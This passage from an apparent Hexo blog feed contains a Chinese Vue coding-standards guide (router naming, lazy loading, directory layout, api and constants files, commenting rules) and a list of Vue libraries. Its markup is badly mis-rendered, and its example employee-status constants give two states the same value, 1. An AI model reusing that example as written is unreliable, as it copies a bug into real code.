v-slot:)&lt;br /&gt;正例：</span><br><span class="line"></span><br></pre></td></tr></table></figure><input  @input="onInput"  @focus="onFocus"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">反例：</span><br><span class="line"></span><br></pre></td></tr></table></figure><input  v-on:input="onInput"  @focus="onFocus"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;a name=&quot;XKmR7&quot;&gt;&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">#### 2.1.4 标签顺序保持一致</span><br><span class="line"></span><br><span class="line">单文件组件应该总是让标签顺序保持为 `&lt;br /&gt;正例：</span><br><span class="line"></span><br></pre></td></tr></table></figure><template>...</template><script>...</script><style>...</style><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">反例：</span><br><span class="line"></span><br></pre></td></tr></table></figure><template>...</template><style>...</style><script>...</script><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;a name=&quot;kJIqE&quot;&gt;&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">#### 2.1.5 必须为 v-for 设置键值 key</span><br><span class="line"></span><br><span class="line">&lt;a name=&quot;wBAPB&quot;&gt;&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">#### 2.1.6 v-show 与 v-if 选择</span><br><span class="line"></span><br><span class="line">如果运行时，需要非常频繁地切换，使用 v-show ；如果在运行时，条件很少改变，使用 v-if。</span><br><span class="line">&lt;a name=&quot;KxH9Y&quot;&gt;&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">#### 2.1.7 script 标签内部结构顺序</span><br><span class="line"></span><br><span class="line">components &gt; props &gt; data &gt; computed &gt; watch &gt; filter &gt; 钩子函数（钩子函数按其执行顺序） &gt; methods</span><br><span class="line">&lt;a name=&quot;QvXxX&quot;&gt;&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">#### 2.1.8 Vue Router 规范</span><br><span class="line"></span><br><span class="line">&lt;a name=&quot;NQAOl&quot;&gt;&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">##### 1) 页面跳转数据传递使用路由参数</span><br><span class="line"></span><br><span class="line">页面跳转，例如 A 页面跳转到 B 页面，需要将 A 页面的数据传递到 B 页面，推荐使用 路由参数进行传参，而不是将需要传递的数据保存 vuex，然后在 B 页面取出 vuex 的数据，因为如果在 B 页面刷新会导致 vuex 数据丢失，导致 B 页面无法正常显示数据。&lt;br /&gt;正例：</span><br><span class="line"></span><br></pre></td></tr></table></figure>let id = ' 123';this.$router.push({ name: 'userCenter', query: { id: id } });<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;a name=&quot;vMEBJ&quot;&gt;&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">##### 2) 使用路由懒加载（延迟加载）机制</span><br><span class="line"></span><br></pre></td></tr></table></figure>{        path: '/uploadAttachment',        name: 'uploadAttachment',        meta: {          title: '上传附件'        },        component: () => import('@/view/components/uploadAttachment/index.vue')      },<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;a name=&quot;rrKVt&quot;&gt;&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">##### 3) router 中的命名规范</span><br><span class="line"></span><br><span class="line">path、childrenPoints 命名规范采用`kebab-case`命名规范（尽量vue文件的目录结构保持一致，因为目录、文件名都是`kebab-case`，这样很方便找到对应的文件）&lt;br /&gt;name 命名规范采用`KebabCase`命名规范且和component组件名保持一致！（因为要保持keep-alive特性，keep-alive按照component的name进行缓存，所以两者必须高度保持一致）</span><br><span class="line"></span><br></pre></td></tr></table></figure>// 动态加载export const reload = [  {    path: '/reload',    name: 'reload',    component: Main,    meta: {      title: '动态加载',      icon: 'icon iconfont'    },    children: [      {        path: '/reload/smart-reload-list',        name: 'SmartReloadList',        meta: {          title: 'SmartReload',          childrenPoints: [            {              title: '查询',              name: 'smart-reload-search'            },            {              title: '执行reload',              name: 'smart-reload-update'            },            {              title: '查看执行结果',              name: 'smart-reload-result'            }          ]        },        component: () =>          import('@/views/reload/smart-reload/smart-reload-list.vue')      }    ]  }];<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;a name=&quot;Qz6x3&quot;&gt;&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">##### 4) router 中的 path 命名规范</span><br><span class="line"></span><br><span class="line">path除了采用`kebab-case`命名规范以外，必须以 / 开头，即使是children里的path也要以 / 开头。如下示例</span><br><span class="line"></span><br><span class="line">- &lt;br /&gt;</span><br><span class="line"></span><br><span class="line">目的：&lt;br /&gt;经常有这样的场景：某个页面有问题，要立刻找到这个vue文件，如果不用以/开头，path为parent和children组成的，可能经常需要在router文件里搜索多次才能找到，而如果以/开头，则能立刻搜索到对应的组件&lt;br /&gt;*</span><br><span class="line"></span><br></pre></td></tr></table></figure>{    path: '/file',    name: 'File',    component: Main,    meta: {      title: '文件服务',      icon: 'ios-cloud-upload'    },    children: [      {        path: '/file/file-list',        name: 'FileList',        component: () => import('@/views/file/file-list.vue')      },      {        path: '/file/file-add',        name: 'FileAdd',        component: () => import('@/views/file/file-add.vue')      },      {        path: '/file/file-update',        name: 'FileUpdate',        component: () => import('@/views/file/file-update.vue')      }    ]  }<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;a name=&quot;XO9zt&quot;&gt;&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">### (二) Vue 项目目录规范</span><br><span class="line"></span><br><span class="line">&lt;a name=&quot;WZHqs&quot;&gt;&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">#### 2.2.1 基础</span><br><span class="line"></span><br><span class="line">vue 项目中的所有命名一定要与后端命名统一。&lt;br /&gt;比如权限：后端 privilege, 前端无论 router , store, api 等都必须使用 privielege 单词！</span><br><span class="line">&lt;a name=&quot;rttWc&quot;&gt;&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">#### 2.2.2 使用 Vue-cli 脚手架</span><br><span class="line"></span><br><span class="line">使用 vue-cli3 来初始化项目，项目名按照上面的命名规范。</span><br><span class="line">&lt;a name=&quot;cCzVN&quot;&gt;&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">#### 2.2.3 目录说明</span><br><span class="line"></span><br><span class="line">目录名按照上面的命名规范，其中 components 组件用大写驼峰，其余除 components 组件目录外的所有目录均使用 kebab-case 命名。</span><br><span class="line"></span><br></pre></td></tr></table></figure>src                               源码目录|-- api                              所有api接口|-- assets                           静态资源，images, icons, styles等|-- components                       公用组件|-- config                           配置信息|-- constants                        常量信息，项目所有Enum, 全局常量等|-- directives                       自定义指令|-- filters                          过滤器，全局工具|-- datas                            模拟数据，临时存放|-- lib                              外部引用的插件存放及修改文件|-- mock                             模拟接口，临时存放|-- plugins                          插件，全局使用|-- router                           路由，统一管理|-- store                            vuex, 统一管理|-- themes                           自定义样式主题|-- views                            视图目录|   |-- role                             role模块名|   |-- |-- role-list.vue                    role列表页面|   |-- |-- role-add.vue                     role新建页面|   |-- |-- role-update.vue                  role更新页面|   |-- |-- index.less                      role模块样式|   |-- |-- components                      role模块通用组件文件夹|   |-- employee                         employee模块<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;a name=&quot;lBRiA&quot;&gt;&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">##### 1) api 目录</span><br><span class="line"></span><br><span class="line">- 文件、变量命名要与后端保持一致。</span><br><span class="line">- 此目录对应后端 API 接口，按照后端一个 controller 一个 api js 文件。若项目较大时，可以按照业务划分子目录，并与后端保持一致。</span><br><span class="line">- api 中的方法名字要与后端 api url 尽量保持语义高度一致性。</span><br><span class="line">- 对于 api 中的每个方法要添加注释，注释与后端 swagger 文档保持一致。</span><br><span class="line"></span><br><span class="line">正例：&lt;br /&gt;后端 url： EmployeeController.java</span><br><span class="line"></span><br></pre></td></tr></table></figure>/employee/add/employee/delete/{id}/employee/update<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">前端： employee.js</span><br><span class="line"></span><br></pre></td></tr></table></figure>// 添加员工  addEmployee: (data) => {    return postAxios('/employee/add', data)  },  // 更新员工信息  updateEmployee: (data) => {    return postAxios('/employee/update', data)  },    // 删除员工  deleteEmployee: (employeeId) => {    return postAxios('/employee/delete/' + employeeId)   },<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;a name=&quot;FUcNR&quot;&gt;&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">##### 2) assets 目录</span><br><span class="line"></span><br><span class="line">assets 为静态资源，里面存放 images, styles, icons 等静态资源，静态资源命名格式为 kebab-case</span><br><span class="line"></span><br></pre></td></tr></table></figure>|assets|-- icons|-- images|   |-- background-color.png|   |-- upload-header.png|-- styles<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;a name=&quot;QRtKi&quot;&gt;&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">##### 3) components 目录</span><br><span class="line"></span><br><span class="line">此目录应按照组件进行目录划分，目录命名为 KebabCase，组件命名规则也为 KebabCase</span><br><span class="line"></span><br></pre></td></tr></table></figure>|components|-- error-log|   |-- index.vue|   |-- index.less|-- markdown-editor|   |-- index.vue|   |-- index.js|-- kebab-case<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;a name=&quot;OD26G&quot;&gt;&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">##### 4) constants 目录</span><br><span class="line"></span><br><span class="line">此目录存放项目所有常量，如果常量在 vue 中使用，请使用 vue-enum 插件([https://www.npmjs.com/package/vue-enum](https://www.npmjs.com/package/vue-enum))&lt;br /&gt;目录结构：</span><br><span class="line"></span><br></pre></td></tr></table></figure>|constants|-- index.js|-- role.js|-- employee.js<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">例子： employee.js</span><br><span class="line"></span><br></pre></td></tr></table></figure>export const EMPLOYEE_STATUS = {  NORMAL: {    value: 1,    desc: '正常'  },  DISABLED: {    value: 1,    desc: '禁用'  },  DELETED: {    value: 2,    desc: '已删除'  }};export const EMPLOYEE_ACCOUNT_TYPE = {  QQ: {    value: 1,    desc: 'QQ登录'  },  WECHAT: {    value: 2,    desc: '微信登录'  },  DINGDING: {    value: 3,    desc: '钉钉登录'  },  USERNAME: {    value: 4,    desc: '用户名密码登录'  }};export default {  EMPLOYEE_STATUS,  EMPLOYEE_ACCOUNT_TYPE};<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;a name=&quot;XPGn4&quot;&gt;&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">##### 5) router 与 store 目录</span><br><span class="line"></span><br><span class="line">这两个目录一定要将业务进行拆分，不能放到一个 js 文件里。&lt;br /&gt;router 尽量按照 views 中的结构保持一致&lt;br /&gt;store 按照业务进行拆分不同的 js 文件</span><br><span class="line">&lt;a name=&quot;aCZ5V&quot;&gt;&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">##### 6) views 目录</span><br><span class="line"></span><br><span class="line">- 命名要与后端、router、api 等保持一致</span><br><span class="line">- components 中组件要使用 PascalCase 规则</span><br><span class="line"></span><br></pre></td></tr></table></figure>|-- views                            视图目录|   |-- role                             role模块名|   |   |-- role-list.vue                    role列表页面|   |   |-- role-add.vue                     role新建页面|   |   |-- role-update.vue                  role更新页面|   |   |-- index.less                      role模块样式|   |   |-- components                      role模块通用组件文件夹|   |   |   |-- role-header.vue                        role头部组件|   |   |   |-- role-modal.vue                         role弹出框组件|   |-- employee                         employee模块|   |-- behavior-log                      行为日志log模块|   |-- code-generator                    代码生成器模块```<p><a name="SdZof"></a></p><h4 id="2-2-4-注释说明"><a href="#2-2-4-注释说明" class="headerlink" title="2.2.4 注释说明"></a>2.2.4 注释说明</h4><p>整理必须加注释的地方</p><ul><li>公共组件使用说明</li><li>api 目录的接口 js 文件必须加注释</li><li>store 中的 state, mutation, action 等必须加注释</li><li>vue 文件中的 template 必须加注释，若文件较大添加 start end 注释</li><li>vue 文件的 methods，每个 method 必须添加注释</li><li>vue 文件的 data, 非常见单词要加注释<br><a name="flWca"></a></li></ul><h4 id="2-2-5-其他"><a href="#2-2-5-其他" class="headerlink" title="2.2.5 其他"></a>2.2.5 其他</h4><p><a name="J7MHY"></a></p><h5 id="1-尽量不要手动操作-DOM"><a href="#1-尽量不要手动操作-DOM" class="headerlink" title="1) 尽量不要手动操作 DOM"></a>1) 尽量不要手动操作 DOM</h5><p>因使用 vue 框架，所以在项目开发中尽量使用 vue 的数据驱动更新 DOM，尽量（不到万不得已）不要手动操作 DOM，包括：增删改 dom 元素、以及更改样式、添加事件等。<br><a name="Bv2v1"></a></p><h5 id="2-删除无用代码"><a href="#2-删除无用代码" class="headerlink" title="2) 删除无用代码"></a>2) 删除无用代码</h5><p>因使用了 git&#x2F;svn 等代码版本工具，对于无用代码必须及时删除，例如：一些调试的 console 语句、无用的弃用功能代码。</p>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> 规范 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端 </tag>
            
            <tag> 规范 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vue 库</title>
      <link href="/2021/09/19/frontend/collection/wheel/vue-ku/"/>
      <url>/2021/09/19/frontend/collection/wheel/vue-ku/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><p><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1658249113976-aac50b99-5921-4a3b-a7e8-0ebadac449dd.png?x-oss-process=image/resize,w_750,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1658249113976-aac50b99-5921-4a3b-a7e8-0ebadac449dd.png?x-oss-process=image/resize,w_750,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"><br><a name="SiTly"></a></p><h1 id="1-状态管理"><a href="#1-状态管理" class="headerlink" title="1. 状态管理"></a><br />1. 状态管理</h1><p><a name="fzcN6"></a></p><h2 id="（1）Pinia"><a href="#（1）Pinia" class="headerlink" title="（1）Pinia"></a>（1）Pinia</h2><p>Pinia 是最新一代的 Vue 轻量级状态管理库。它适用于 Vue 2.x 和 Vue 3.x。它是 Vue 官方成员在2019年11月重新设计的一个状态存储库，它允许你跨组件&#x2F;页面共享状态，并且是响应式的，类似于 Vuex。<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1658240532615-2a0e69d6-67b6-4fc7-86f0-85ede2ca5efc.png?x-oss-process=image/resize,w_956,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1658240532615-2a0e69d6-67b6-4fc7-86f0-85ede2ca5efc.png?x-oss-process=image/resize,w_956,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"><br><a name="D8Dnn"></a></p><h2 id="（2）Vuex"><a href="#（2）Vuex" class="headerlink" title="（2）Vuex"></a><br />（2）Vuex</h2><p>Vuex 是一个专为 Vue.js 应用程序开发的状态管理模式。它采用集中式存储管理应用的所有组件的状态，并以相应的规则保证状态以一种可预测的方式发生变化。<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1658240637248-ebca700a-c553-47f0-a1b0-f4c29c182a4b.png?x-oss-process=image/resize,w_957,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1658240637248-ebca700a-c553-47f0-a1b0-f4c29c182a4b.png?x-oss-process=image/resize,w_957,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"><br><a name="fBZ7u"></a></p><h2 id="（3）vuex-persist"><a href="#（3）vuex-persist" class="headerlink" title="（3）vuex-persist"></a><br />（3）vuex-persist</h2><p>vuex-persistedstate 是一个支持 Typescript 的Vuex插件，使你能够将应用程序的状态保存到持久存储中，例如 Cookies 或 localStorage。<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1658241184423-55a6ddf9-29fe-425c-8fe6-6e99b04fe714.png?x-oss-process=image/resize,w_958,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1658241184423-55a6ddf9-29fe-425c-8fe6-6e99b04fe714.png?x-oss-process=image/resize,w_958,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"><br><a name="EFDw2"></a></p><h1 id="2-表单"><a href="#2-表单" class="headerlink" title="2. 表单"></a><br />2. 表单</h1><p><a name="Hl6Xo"></a></p><h2 id="（1）VeeValidate"><a href="#（1）VeeValidate" class="headerlink" title="（1）VeeValidate"></a>（1）VeeValidate</h2><p>vee-validate 是Vue.js的表单验证库，它允许验证输入并以熟悉的声明式样式或使用组合函数构建更好的表单 UI。<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1658244322020-a5806224-d508-42c7-b040-dcf5a2f227b4.png?x-oss-process=image/resize,w_952,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1658244322020-a5806224-d508-42c7-b040-dcf5a2f227b4.png?x-oss-process=image/resize,w_952,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"><br><a name="OkqPQ"></a></p><h2 id="（2）vue-form-making"><a href="#（2）vue-form-making" class="headerlink" title="（2）vue-form-making"></a><br />（2）vue-form-making</h2><p>vue-form-making 是一个基于 vue 和 element-ui 实现的可视化表单设计器，使用了最新的前端技术栈，内置了 i18n 国际化解决方案，可以让表单开发简单而高效。<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1658244554598-4310d3e7-3091-4310-9c3b-70e5de91317b.png?x-oss-process=image/resize,w_958,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1658244554598-4310d3e7-3091-4310-9c3b-70e5de91317b.png?x-oss-process=image/resize,w_958,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"><br><a name="vMXrC"></a></p><h2 id="（3）FormKit"><a href="#（3）FormKit" class="headerlink" title="（3）FormKit"></a><br />（3）FormKit</h2><p>FormKit 是一个面向 Vue 开发人员的表单创作框架，它使构建高质量的生产就绪表单的速度提高了 10 倍。<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1658244690324-e745f913-a5f9-47e2-854f-9bae60ecef5f.png?x-oss-process=image/resize,w_954,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1658244690324-e745f913-a5f9-47e2-854f-9bae60ecef5f.png?x-oss-process=image/resize,w_954,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"><br><a name="iYuba"></a></p><h1 id="3-文档"><a href="#3-文档" class="headerlink" title="3. 文档"></a><br />3. 文档</h1><p><a name="diAh4"></a></p><h2 id="（1）VitePress"><a href="#（1）VitePress" class="headerlink" title="（1）VitePress"></a>（1）VitePress</h2><p>VitePress 是 VuePress 的继承者，建立在vite 之上。目前，正处于alpha阶段。它已经适合开箱即用的文档使用，但配置和主题 API 可能仍会在次要版本之间发生变化。<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1658241882514-095613ba-77a2-4793-9c49-b5a3dd9d0045.png?x-oss-process=image/resize,w_958,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1658241882514-095613ba-77a2-4793-9c49-b5a3dd9d0045.png?x-oss-process=image/resize,w_958,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><a name="rI8Zb"></a></p><h2 id="（2）VuePress"><a href="#（2）VuePress" class="headerlink" title="（2）VuePress"></a>（2）VuePress</h2><p>VuePress 是一个基于 Vue 的轻量级静态网站生成器，以及为编写技术文档而优化的默认主题。 它是为了满足 Vue 自己的子项目文档的需求而创建的。<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1658241791565-51890648-63e4-47bc-8581-479e5a4aeafc.png?x-oss-process=image/resize,w_956,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1658241791565-51890648-63e4-47bc-8581-479e5a4aeafc.png?x-oss-process=image/resize,w_956,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><a name="S7MNQ"></a></p><h2 id="（3）Gridsome"><a href="#（3）Gridsome" class="headerlink" title="（3）Gridsome"></a>（3）Gridsome</h2><p>Gridsome 是一个基于 Vue.js 构建的 Jamstack 框架，它让开发人员可以轻松地构建静态生成的网站和应用程序，这些网站和应用程序天生速度快。<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1658247087501-fe2c275f-e7be-4011-8618-6e3f6da4ac9b.png?x-oss-process=image/resize,w_956,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1658247087501-fe2c275f-e7be-4011-8618-6e3f6da4ac9b.png?x-oss-process=image/resize,w_956,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"><br><a name="KD3jT"></a></p><h1 id="4-测试"><a href="#4-测试" class="headerlink" title="4. 测试"></a><br />4. 测试</h1><p><a name="dyNRp"></a></p><h2 id="（1）Vitest"><a href="#（1）Vitest" class="headerlink" title="（1）Vitest"></a>（1）Vitest</h2><p>Vitest 是一个由 Vite 提供支持的极速单元测试框架。其和 Vite 的配置、转换器、解析器和插件保持一致，具有开箱即用的 TypeScript &#x2F; JSX 支持。<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1658242281270-7d006534-6f79-48cc-ac3a-1ab58b1af72e.png?x-oss-process=image/resize,w_954,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1658242281270-7d006534-6f79-48cc-ac3a-1ab58b1af72e.png?x-oss-process=image/resize,w_954,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"><br><a name="lvZ5P"></a></p><h2 id="（2）Jest"><a href="#（2）Jest" class="headerlink" title="（2）Jest"></a><br />（2）Jest</h2><p>Jest 是一个全面的 JavaScript 测试解决方案，专注于简洁明快。适用于大多数 JavaScript 项目。<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1658242600801-d9bcf342-7c55-426c-8694-4da4b9653686.png?x-oss-process=image/resize,w_958,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1658242600801-d9bcf342-7c55-426c-8694-4da4b9653686.png?x-oss-process=image/resize,w_958,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"><br><a name="ebERg"></a></p><h2 id="（3）Mocha"><a href="#（3）Mocha" class="headerlink" title="（3）Mocha"></a><br />（3）Mocha</h2><p>mocha是一个功能丰富的javascript测试框架，运行在node.js和浏览器中，使异步测试变得简单有趣。Mocha测试连续运行，允许灵活和准确的报告，同时将未捕获的异常映射到正确的测试用例。<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1658242834462-44236ea1-0527-46b9-8ecb-e51ad65ef5ad.png?x-oss-process=image/resize,w_945,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1658242834462-44236ea1-0527-46b9-8ecb-e51ad65ef5ad.png?x-oss-process=image/resize,w_945,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"><br><a name="GkI1w"></a></p><h1 id="5-可视化"><a href="#5-可视化" class="headerlink" title="5. 可视化"></a><br />5. 可视化</h1><p><a name="WHM2e"></a></p><h2 id="（1）Vue-ChartJS"><a href="#（1）Vue-ChartJS" class="headerlink" title="（1）Vue ChartJS"></a>（1）Vue ChartJS</h2><p>vue-chartjs 是一个 Vue 对于 Chart.js 的封装，让用户可以在Vue中轻松使用Chart.js，很简单的创建可复用的图表组件，非常适合需要简单的图表并尽可能快地运行的人。 vue-chartjs抽象了基本逻辑，同时也暴露了Chart.js对象，让用户获得最大的灵活性。它支持 Vue 3 和 Vue 2。<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1658243328737-ef5294c0-4185-41a0-9567-421c5f583e29.png?x-oss-process=image/resize,w_958,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1658243328737-ef5294c0-4185-41a0-9567-421c5f583e29.png?x-oss-process=image/resize,w_958,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"><br><a name="KuLA0"></a></p><h2 id="（2）Apache-ECharts"><a href="#（2）Apache-ECharts" class="headerlink" title="（2）Apache ECharts"></a><br />（2）Apache ECharts</h2><p>Apache ECharts 是一款基于Javascript的数据可视化图表库，提供直观，生动，可交互，可个性化定制的数据可视化图表。它是用纯 JavaScript 编写的，基于zrender，是一个全新的轻量级画布库。<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1658243634219-bdf272dd-a253-4d6d-9eca-bc1dd0292d32.png?x-oss-process=image/resize,w_750,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1658243634219-bdf272dd-a253-4d6d-9eca-bc1dd0292d32.png?x-oss-process=image/resize,w_750,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"><br><a name="rqUhQ"></a></p><h2 id="（3）Vue-ECharts"><a href="#（3）Vue-ECharts" class="headerlink" title="（3）Vue-ECharts"></a><br />（3）Vue-ECharts</h2><p>Vue-ECharts 是 Apache ECharts 的 Vue.js 组件。使用 Apache ECharts 5，同时支持 Vue.js 2&#x2F;3。<br /><img 